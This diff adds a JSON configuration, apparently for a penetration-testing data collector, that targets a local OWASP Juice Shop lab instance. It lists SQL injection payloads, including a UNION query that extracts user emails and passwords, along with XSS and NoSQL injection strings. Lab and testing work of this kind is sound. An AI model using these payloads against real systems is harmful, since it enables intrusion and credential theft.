@@ -1,0 +1,30 @@
+{
+    "urls_alvo": [
+        "http://localhost:3000/rest/products/search?q=apple",
+        "http://localhost:3000/rest/user/login",
+        "http://localhost:3000/api/Products"
+    ],
+    "payloads": {
+        "sqli": [
+            "' or 1=1--",
+            "1')) OR 1=1--",
+            "apple')) UNION SELECT id, email, password, '4' FROM Users--"
+        ],
+        "xss": [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(2)>"
+        ],
+        "nosqli": [
+            "{'$gt':''}",
+            "email={\"$regex\":\"admin\"}&password[\"$ne\"]="
+        ]
+    },
+    "headers": {
+        "User-Agent": "PenteIA-DataCollector/2.0",
+        "Accept": "application/json"
+    },
+    "max_workers": 3,
+    "timeout": 10,
+    "output_file": "juiceshop_data.csv",
+    "delay_between_requests": 1.0
+}
